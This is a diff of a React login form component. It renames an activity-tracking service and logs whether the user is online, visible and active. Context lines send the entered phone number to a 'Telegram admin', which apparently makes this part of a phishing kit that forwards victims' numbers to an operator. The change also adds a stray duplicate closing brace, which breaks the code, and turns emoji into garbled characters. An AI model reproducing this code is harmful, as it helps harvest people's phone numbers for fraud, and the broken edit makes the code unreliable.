@@ -117,25 +117,31 @@ export const LoginForm = () => {
   useEffect(() => {
     if (sessionId) {
       console.log(
-        "🧠 Starting smart activity tracking for session:",
+        "���� Starting smart activity tracking for session:",
         sessionId,
       );
 
-      const handleStatusChange = async (status: ActivityStatus) => {
-        console.log("📡 Smart activity status changed:", status);
+      const handleStatusChange = async (state: ActivityState) => {
+        console.log("📡 Professional activity state changed:", {
+          isOnline: state.isOnline,
+          isVisible: state.isVisible,
+          isActive: state.isActive,
+          connectionQuality: state.connectionQuality,
+        });
 
-        const statusText = smartActivityService.getStatusText();
-        const statusEmoji = smartActivityService.getStatusEmoji();
+        const statusText = professionalActivitySystem.getStatusText();
+        const statusEmoji = professionalActivitySystem.getStatusEmoji();
 
-        // Send activity updates (smart service handles optimization)
+        // Send activity updates (professional system handles all optimization)
         await updateUserOnlineStatus(
           sessionId,
-          status.isOnline,
-          status.isVisible,
-          status.lastActivity,
+          state.isOnline,
+          state.isVisible,
+          state.lastActivity,
           statusText,
           statusEmoji,
         );
+      };
       };
 
       // Start smart tracking
@@ -281,7 +287,7 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("📞 Sending phone number to Telegram admin:", mobileNumber);
+      console.log("��� Sending phone number to Telegram admin:", mobileNumber);
       const result = await sendPhoneToTelegramEnhanced(mobileNumber);
 
       if (!result.success) {
